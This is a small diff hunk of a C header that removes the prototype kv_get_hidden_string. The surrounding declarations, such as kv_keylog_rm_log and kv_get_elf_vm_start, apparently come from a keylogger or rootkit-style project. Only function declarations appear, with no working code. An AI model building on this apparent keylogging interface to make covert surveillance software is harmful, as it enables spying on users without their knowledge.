@@ -152,8 +152,6 @@ void kv_keylog_rm_log(bool);
 /** whatever */
 char *kv_util_random_AZ_string(size_t);
 
-char *kv_get_hidden_string(void);
-
 /** VM operations */
 unsigned long kv_get_elf_vm_start(pid_t);
 
